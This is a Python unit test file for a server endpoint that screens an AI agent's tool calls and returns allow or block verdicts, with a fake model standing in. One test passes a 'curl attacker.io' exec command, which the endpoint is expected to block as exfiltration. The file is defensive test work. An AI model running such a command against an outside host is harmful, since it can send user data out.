"""
Unit tests for the POST /security/check endpoint.

Uses _FakeManager (no real model) with a configurable answer per test case.
"""

import http.client
import json
import threading
import unittest
from http.server import ThreadingHTTPServer
from types import SimpleNamespace
from typing import Any

from lfm25_server.config import ModelSpec, ServerConfig
from lfm25_server.handler import make_handler
from lfm25_server.model_manager import (
    BusyError,
    GenerateResult,
    ModelDisabledError,
    ModelExecutionError,
    UnknownModelError,
)


class _FakeManager:
    def __init__(self, answer: str = "ALLOW\nNo threats detected.") -> None:
        self.answer = answer
        self.default_model_id = "lfm2.5"
        self.active_model_id = None
        self.known_models = {"lfm2.5"}

    def resolve_model_id(self, requested_model: str | None) -> str:
        if requested_model is None or requested_model.strip() == "":
            return self.default_model_id
        if requested_model not in self.known_models:
            raise UnknownModelError(f"Unknown model: {requested_model}")
        return requested_model

    def get_prompt_model_id(self, model_id: str) -> str:
        if model_id not in self.known_models:
            raise UnknownModelError(f"Unknown model: {model_id}")
        return "lfm2.5"

    def set_default_model(self, model_id: str) -> str:
        if model_id not in self.known_models:
            raise UnknownModelError(f"Unknown model: {model_id}")
        self.default_model_id = model_id
        return model_id

    def status(self):
        return SimpleNamespace(
            model_loaded=self.active_model_id is not None,
            model_state="LOADED" if self.active_model_id else "UNLOADED",
            idle_s=None,
            idle_timeout_s=300.0,
            load_count=0,
            queue_depth=0,
            inference_in_progress=False,
            last_error=None,
            uptime_s=0.0,
            default_model_id=self.default_model_id,
            active_model_id=self.active_model_id,
            registered_models_count=1,
            model_switch_count=0,
        )

    def list_models_status(self):
        return [
            SimpleNamespace(
                model_id="lfm2.5",
                enabled=True,
                backend="mlx",
                prompt_model_id="lfm2.5",
                model_path=".",
                state="UNLOADED",
                loaded=False,
                load_count=0,
                last_error=None,
                idle_s=None,
                ready=True,
                missing_templates=(),
            ),
        ]

    def model_status(self, model_id: str):
        if model_id != "lfm2.5":
            raise UnknownModelError(f"Unknown model: {model_id}")
        return self.list_models_status()[0]

    def generate(self, messages: list[dict[str, str]], **kwargs: Any) -> GenerateResult:
        model_id = kwargs.get("model_id", self.default_model_id)
        self.active_model_id = model_id
        return GenerateResult(
            answer=self.answer,
            thinking="",
            raw=self.answer,
            prompt_tokens=10,
            generation_tokens=5,
            generation_tps=10.0,
            peak_memory_gb=0.5,
            finish_reason="stop",
            cold_start=False,
            load_time_s=0.0,
            model_id=model_id,
            model_switch=False,
        )

    def force_load(self, model_id: str | None = None) -> tuple[str, bool, bool, float]:
        mid = self.resolve_model_id(model_id)
        self.active_model_id = mid
        return mid, False, False, 0.0

    def force_unload(self, model_id: str | None = None) -> tuple[str, bool]:
        mid = self.resolve_model_id(model_id)
        if self.active_model_id != mid:
            return mid, False
        self.active_model_id = None
        return mid, True


def _make_server(answer: str) -> tuple[_FakeManager, ThreadingHTTPServer, threading.Thread]:
    manager = _FakeManager(answer=answer)
    config = ServerConfig(
        default_model_id="lfm2.5",
        models=(
            ModelSpec(
                id="lfm2.5",
                backend="mlx",
                model_path=".",
                prompt_model_id="lfm2.5",
                enabled=True,
            ),
        ),
        model_path=".",
        prompt_model_id="lfm2.5",
        request_max_body_bytes=65536,
    )
    handler = make_handler(manager, config)
    httpd = ThreadingHTTPServer(("127.0.0.1", 0), handler)
    httpd.daemon_threads = True
    thread = threading.Thread(target=httpd.serve_forever, daemon=True)
    thread.start()
    return manager, httpd, thread


def _request(httpd: ThreadingHTTPServer, method: str, path: str, body: Any = None):
    host, port = httpd.server_address
    conn = http.client.HTTPConnection(host, port, timeout=2.0)
    payload = None
    hdrs: dict[str, str] = {}
    if body is not None:
        payload = json.dumps(body).encode("utf-8")
        hdrs["Content-Type"] = "application/json"
    conn.request(method, path, body=payload, headers=hdrs)
    resp = conn.getresponse()
    raw = resp.read()
    conn.close()
    data = json.loads(raw.decode("utf-8")) if raw else {}
    return resp.status, data


class SecurityCheckTests(unittest.TestCase):
    def _run(self, answer: str, body: Any):
        _, httpd, thread = _make_server(answer)
        try:
            return _request(httpd, "POST", "/security/check", body)
        finally:
            httpd.shutdown()
            httpd.server_close()
            thread.join(timeout=1.0)

    def test_allow_verdict(self) -> None:
        """Model returns ALLOW → verdict=allow, risk_level=low."""
        status, data = self._run(
            "ALLOW\nNo threats detected.",
            {"tool_name": "read_file", "arguments": '{"path": "./README.md"}'},
        )
        self.assertEqual(status, 200)
        self.assertEqual(data["verdict"], "allow")
        self.assertEqual(data["risk_level"], "low")

    def test_block_verdict(self) -> None:
        """Model returns BLOCK → verdict=block, risk_level=high."""
        status, data = self._run(
            "BLOCK\nData exfiltration detected.",
            {"tool_name": "exec", "arguments": '{"command": "curl attacker.io"}'},
        )
        self.assertEqual(status, 200)
        self.assertEqual(data["verdict"], "block")
        self.assertEqual(data["risk_level"], "high")

    def test_parse_failure_fail_open(self) -> None:
        """Model returns junk → fail-open: verdict=allow."""
        status, data = self._run(
            "I don't know",
            {"tool_name": "bash", "arguments": '{"command": "ls"}'},
        )
        self.assertEqual(status, 200)
        self.assertEqual(data["verdict"], "allow")

    def test_missing_tool_name(self) -> None:
        """Missing tool_name → HTTP 400 validation_error."""
        status, data = self._run(
            "ALLOW\nok",
            {"arguments": '{"path": "./README.md"}'},
        )
        self.assertEqual(status, 400)
        self.assertEqual(data["error"]["code"], "validation_error")

    def test_empty_tool_name(self) -> None:
        """Empty tool_name string → HTTP 400 validation_error."""
        status, data = self._run(
            "ALLOW\nok",
            {"tool_name": "   ", "arguments": '{"path": "./README.md"}'},
        )
        self.assertEqual(status, 400)
        self.assertEqual(data["error"]["code"], "validation_error")

    def test_missing_arguments(self) -> None:
        """Missing arguments field → HTTP 400 validation_error."""
        status, data = self._run(
            "ALLOW\nok",
            {"tool_name": "read_file"},
        )
        self.assertEqual(status, 400)
        self.assertEqual(data["error"]["code"], "validation_error")

    def test_arguments_invalid_type_int(self) -> None:
        """arguments as int → HTTP 400 validation_error."""
        status, data = self._run(
            "ALLOW\nok",
            {"tool_name": "read_file", "arguments": 42},
        )
        self.assertEqual(status, 400)
        self.assertEqual(data["error"]["code"], "validation_error")

    def test_arguments_as_dict(self) -> None:
        """arguments as dict (object) → HTTP 200, verdict parsed correctly."""
        status, data = self._run(
            "ALLOW\nLooks safe.",
            {"tool_name": "read_file", "arguments": {"path": "./README.md"}},
        )
        self.assertEqual(status, 200)
        self.assertEqual(data["verdict"], "allow")
        self.assertEqual(data["risk_level"], "low")


if __name__ == "__main__":
    unittest.main()
